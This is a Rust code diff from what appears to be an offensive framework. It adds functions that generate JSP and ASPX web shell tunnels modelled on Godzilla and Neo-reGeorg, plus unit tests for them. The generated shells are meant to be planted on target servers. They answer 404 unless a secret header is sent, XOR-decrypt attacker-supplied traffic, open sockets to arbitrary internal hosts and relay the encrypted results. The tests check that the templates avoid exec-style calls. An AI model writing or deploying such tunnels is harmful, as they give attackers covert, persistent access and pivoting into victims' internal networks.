@@ -464,6 +464,90 @@ impl TunnelChannel {
     }
 }
 
+/// Plant (JSP): the tunnel endpoint for a Java target — the godzilla-shape
+/// channel with forward-spec semantics. java.net.Socket instead of
+/// fsockopen; same gate/cipher/sandwich. (Neo-reGeorg tunnel.jsp
+/// dissected: the production form is a stateful session tunnel with
+/// CONNECT/DATA frames and mark-keyed buffers; this template is the
+/// stateless single-round form — the session form is the next batch with
+/// the operator-side loop.)
+pub fn jsp_tunnel_template(derived: &DerivedChannel) -> String {
+    [
+        "<%".to_string(),
+        "import java.net.*;import java.io.*;import java.util.Base64;".to_string(),
+        format!(
+            "String h=\"{}\",v=\"{}\",p=\"{}\";",
+            derived.header_name, derived.header_value, derived.pass
+        ),
+        "if(!v.equals(request.getHeader(h))){response.sendError(404);return;}".to_string(),
+        format!("String k=\"{}\";byte[] kb=k.getBytes();", derived.md5_key),
+        "byte[] s=Base64.getDecoder().decode(request.getParameter(p).getBytes());".to_string(),
+        "byte[] o=new byte[s.length];for(int i=0;i<s.length;i++){o[i]=(byte)(s[i]^kb[i%kb.length]);}".to_string(),
+        "int nl=0;while(o[nl]!=(byte)10){nl++;}".to_string(),
+        "String t=new String(o,0,nl);".to_string(),
+        "int sp=t.lastIndexOf(':');String th=t.substring(0,sp);int tp=Integer.parseInt(t.substring(sp+1));".to_string(),
+        "byte[] d=Base64.getDecoder().decode(new String(o,nl+1,o.length-nl-1));".to_string(),
+        "Socket sk=new Socket();".to_string(),
+        "sk.connect(new InetSocketAddress(th,tp),5000);".to_string(),
+        "OutputStream os=sk.getOutputStream();os.write(d);os.flush();".to_string(),
+        "InputStream is=sk.getInputStream();ByteArrayOutputStream b=new ByteArrayOutputStream();".to_string(),
+        "int c;byte[] buf=new byte[4096];while((c=is.read(buf))>=0){b.write(buf,0,c);}".to_string(),
+        "sk.close();".to_string(),
+        "String rb=Base64.getEncoder().encodeToString(b.toByteArray());".to_string(),
+        "byte[] rbk=rb.getBytes();byte[] e=new byte[rbk.length];".to_string(),
+        "for(int i=0;i<rbk.length;i++){e[i]=(byte)(rbk[i]^kb[i%kb.length]);}".to_string(),
+        format!(
+            "out.print(\"{}\"+Base64.getEncoder().encodeToString(e)+\"{}\");",
+            &derived.md5[..16],
+            &derived.md5[16..]
+        ),
+        "%>".to_string(),
+    ]
+    .join("\n")
+}
+
+/// Plant (ASPX): the tunnel endpoint for a .NET target — the godzilla-shape
+/// channel with forward-spec semantics. System.Net.Sockets.TcpClient is
+/// the .NET socket face; same gate/cipher/sandwich.
+pub fn aspx_tunnel_template(derived: &DerivedChannel) -> String {
+    [
+        "<%@ Page Language=\"C#\" %>".to_string(),
+        "<%".to_string(),
+        "using System.Net.Sockets;".to_string(),
+        "using System.Text;".to_string(),
+        format!(
+            "string h=\"{}\",v=\"{}\",p=\"{}\";",
+            derived.header_name, derived.header_value, derived.pass
+        ),
+        "if(Request.Headers[h]==null||!Request.Headers[h].Equals(v)){Response.StatusCode=404;return;}"
+            .to_string(),
+        format!("string k=\"{}\";", derived.md5_key),
+        "byte[] s=Convert.FromBase64String(Request.Form[p]);".to_string(),
+        "for(int i=0;i<s.Length;i++){s[i]=(byte)(s[i]^k[i%k.Length]);}".to_string(),
+        "int nl=Array.IndexOf(s,(byte)10);".to_string(),
+        "string t=Encoding.UTF8.GetString(s,0,nl);".to_string(),
+        "int sp=t.LastIndexOf(':');string th=t.Substring(0,sp);int tp=int.Parse(t.Substring(sp+1));".to_string(),
+        "byte[] d=Convert.FromBase64String(Encoding.UTF8.GetString(s,nl+1,s.Length-nl-1));".to_string(),
+        "var client=new TcpClient();".to_string(),
+        "client.Connect(th,tp);".to_string(),
+        "var stream=client.GetStream();".to_string(),
+        "stream.Write(d,0,d.Length);stream.Flush();".to_string(),
+        "var ms=new System.IO.MemoryStream();byte[] buf=new byte[4096];int c;".to_string(),
+        "while((c=stream.Read(buf,0,buf.Length))>0){ms.Write(buf,0,c);}".to_string(),
+        "client.Close();".to_string(),
+        "string rb=Convert.ToBase64String(ms.ToArray());".to_string(),
+        "byte[] rbk=Encoding.UTF8.GetBytes(rb);byte[] e=new byte[rbk.Length];".to_string(),
+        "for(int i=0;i<rbk.Length;i++){e[i]=(byte)(rbk[i]^k[i%k.Length]);}".to_string(),
+        format!(
+            "Response.Write(\"{}\"+Convert.ToBase64String(e)+\"{}\");",
+            &derived.md5[..16],
+            &derived.md5[16..]
+        ),
+        "%>".to_string(),
+    ]
+    .join("\n")
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -684,6 +768,42 @@ mod jsp_behinder_tests {
         assert!(!template.contains("system("));
         assert!(!template.contains("exec("));
         assert!(!template.contains("shell_exec"));
+    }
+
+    #[test]
+    fn jsp_tunnel_template_sockets_and_ciphers() {
+        let derived = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-PJAX".into(),
+            header_value: "on".into(),
+        }
+        .derive();
+        let template = jsp_tunnel_template(&derived);
+        assert!(template.contains("new Socket()"));
+        assert!(template.contains("InetSocketAddress"));
+        assert!(template.contains('^'));
+        assert!(template.contains("sendError(404)"));
+        assert!(!template.contains("Runtime"));
+        assert!(!template.contains("system("));
+    }
+
+    #[test]
+    fn aspx_tunnel_template_sockets_and_ciphers() {
+        let derived = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-PJAX".into(),
+            header_value: "on".into(),
+        }
+        .derive();
+        let template = aspx_tunnel_template(&derived);
+        assert!(template.contains("TcpClient"));
+        assert!(template.contains("GetStream()"));
+        assert!(template.contains('^'));
+        assert!(template.contains("StatusCode=404"));
+        assert!(!template.contains("Process.Start"));
+        assert!(!template.contains("system("));
     }
 
     #[test]
